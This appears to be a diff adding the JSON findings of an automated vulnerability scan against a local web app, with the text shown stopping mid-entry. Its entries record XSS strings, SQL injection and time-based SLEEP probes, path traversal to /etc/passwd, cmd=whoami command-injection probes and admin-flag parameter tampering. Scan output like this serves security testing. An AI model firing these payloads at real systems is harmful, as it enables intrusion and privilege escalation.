@@ -1,0 +1,4780 @@
+[
+    {
+        "type": "AI_XSS",
+        "endpoint": "http://localhost:3001/rest/2fa/disable",
+        "param": "uid",
+        "payload": "%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E",
+        "confidence_score": 100,
+        "severity": "HIGH"
+    },
+    {
+        "type": "AI_XSS",
+        "endpoint": "http://localhost:3001/rest/2fa/verify",
+        "param": "account",
+        "payload": "%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E",
+        "confidence_score": 100,
+        "severity": "HIGH"
+    },
+    {
+        "type": "AI_XSS",
+        "endpoint": "http://localhost:3001/rest/continue-code-fixIt/apply/",
+        "param": "userId",
+        "payload": "%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E",
+        "confidence_score": 100,
+        "severity": "HIGH"
+    },
+    {
+        "type": "AI_XSS",
+        "endpoint": "http://localhost:3001/rest/continue-code-fixIt/apply/",
+        "param": "uid",
+        "payload": "%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E",
+        "confidence_score": 100,
+        "severity": "HIGH"
+    },
+    {
+        "type": "AI_XSS",
+        "endpoint": "http://localhost:3001/rest/continue-code-fixIt/apply/",
+        "param": "token",
+        "payload": "%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E",
+        "confidence_score": 100,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/disable",
+        "param": "admin",
+        "payload": "1",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/disable",
+        "param": "admin",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/disable",
+        "param": "admin",
+        "payload": "yes",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/disable",
+        "param": "isAdmin",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/disable",
+        "param": "isAdmin",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/disable",
+        "param": "isAdmin",
+        "payload": "yes",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/disable",
+        "param": "role",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/disable",
+        "param": "role",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/disable",
+        "param": "debug",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/disable",
+        "param": "debug",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/disable",
+        "param": "access",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/disable",
+        "param": "access",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/disable",
+        "param": "privilege",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/disable",
+        "param": "privilege",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/disable",
+        "param": "auth",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/disable",
+        "param": "token",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/disable",
+        "param": "token",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/verify",
+        "param": "admin",
+        "payload": "1",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/verify",
+        "param": "admin",
+        "payload": "yes",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/verify",
+        "param": "admin",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/verify",
+        "param": "isAdmin",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/verify",
+        "param": "isAdmin",
+        "payload": "yes",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/verify",
+        "param": "isAdmin",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/verify",
+        "param": "role",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/verify",
+        "param": "role",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/verify",
+        "param": "debug",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/verify",
+        "param": "access",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/verify",
+        "param": "access",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/verify",
+        "param": "privilege",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/verify",
+        "param": "auth",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/verify",
+        "param": "token",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/2fa/verify",
+        "param": "token",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code-fixIt/apply/",
+        "param": "admin",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code-fixIt/apply/",
+        "param": "admin",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code-fixIt/apply/",
+        "param": "admin",
+        "payload": "1",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code-fixIt/apply/",
+        "param": "isAdmin",
+        "payload": "yes",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code-fixIt/apply/",
+        "param": "isAdmin",
+        "payload": "1",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code-fixIt/apply/",
+        "param": "isAdmin",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code-fixIt/apply/",
+        "param": "role",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code-fixIt/apply/",
+        "param": "role",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code-fixIt/apply/",
+        "param": "debug",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code-fixIt/apply/",
+        "param": "debug",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code-fixIt/apply/",
+        "param": "access",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code-fixIt/apply/",
+        "param": "privilege",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code-fixIt/apply/",
+        "param": "auth",
+        "payload": "admin",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "HIDDEN_PARAM",
+        "endpoint": "http://localhost:3001/rest/continue-code-fixIt/apply/",
+        "param": "token",
+        "payload": "true",
+        "confidence_score": 70,
+        "severity": "HIGH"
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/image-captcha/",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/rest/image-captcha/?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/image-captcha/",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/rest/image-captcha/?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/image-captcha/",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/rest/image-captcha/?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/image-captcha/",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/rest/image-captcha/?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/image-captcha/",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/rest/image-captcha/?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/continue-code-fixIt/apply/",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/rest/continue-code-fixIt/apply/?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/continue-code-fixIt/apply/",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/rest/continue-code-fixIt/apply/?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/continue-code-fixIt/apply/",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/rest/continue-code-fixIt/apply/?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/continue-code-fixIt/apply/",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/rest/continue-code-fixIt/apply/?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "reflected",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/continue-code-fixIt/apply/",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/rest/continue-code-fixIt/apply/?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/SecurityAnswers",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/api/SecurityAnswers?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/SecurityAnswers",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/api/SecurityAnswers?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/SecurityAnswers",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/api/SecurityAnswers?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/SecurityAnswers",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/api/SecurityAnswers?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/api/SecurityAnswers",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/api/SecurityAnswers?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/2fa/disable",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/rest/2fa/disable?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/2fa/disable",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/rest/2fa/disable?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/2fa/disable",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/rest/2fa/disable?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/2fa/disable",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/rest/2fa/disable?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "reflected",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/2fa/disable",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/rest/2fa/disable?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/country-mapping",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/rest/country-mapping?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "unknown",
+        "severity": "MEDIUM",
+        "confidence_score": 65
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/country-mapping",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/rest/country-mapping?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "unknown",
+        "severity": "MEDIUM",
+        "confidence_score": 65
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/country-mapping",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/rest/country-mapping?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "unknown",
+        "severity": "MEDIUM",
+        "confidence_score": 65
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/country-mapping",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/rest/country-mapping?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "unknown",
+        "severity": "MEDIUM",
+        "confidence_score": 65
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/country-mapping",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/rest/country-mapping?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "unknown",
+        "severity": "MEDIUM",
+        "confidence_score": 65
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/user/whoami",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/rest/user/whoami?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/user/whoami",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/rest/user/whoami?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/user/whoami",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/rest/user/whoami?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/user/whoami",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/rest/user/whoami?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/user/whoami",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/rest/user/whoami?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/repeat-notification",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/rest/repeat-notification?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/repeat-notification",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/rest/repeat-notification?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/repeat-notification",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/rest/repeat-notification?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/repeat-notification",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/rest/repeat-notification?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/repeat-notification",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/rest/repeat-notification?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/user/security-question?email=",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/rest/user/security-question?email=&q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/user/security-question?email=",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/rest/user/security-question?email=&q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/user/security-question?email=",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/rest/user/security-question?email=&file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/user/security-question?email=",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/rest/user/security-question?email=&cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/user/security-question?email=",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/rest/user/security-question?email=&search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/languages",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/rest/languages?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/languages",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/rest/languages?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/languages",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/rest/languages?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/languages",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/rest/languages?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/languages",
+        "payload": "search=' OR SLEEP(5)--",
+        "test_url": "http://localhost:3001/rest/languages?search=%27+OR+SLEEP%285%29--",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/2fa/verify",
+        "payload": "id=1 OR 1=1",
+        "test_url": "http://localhost:3001/rest/2fa/verify?q=id%3D1+OR+1%3D1",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/2fa/verify",
+        "payload": "q=<script>alert(1)</script>",
+        "test_url": "http://localhost:3001/rest/2fa/verify?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/2fa/verify",
+        "payload": "file=../../etc/passwd",
+        "test_url": "http://localhost:3001/rest/2fa/verify?file=..%2F..%2Fetc%2Fpasswd",
+        "ml_prediction": "unknown",
+        "response_prediction": "clean",
+        "severity": "MEDIUM",
+        "confidence_score": 85
+    },
+    {
+        "type": "SMART_SCAN",
+        "endpoint": "http://localhost:3001/rest/2fa/verify",
+        "payload": "cmd=whoami",
+        "test_url": "http://localhost:3001/rest/2fa/verify?cmd=whoami",
+        "ml_prediction": "unknown",
+        "response_prediction": "reflected",
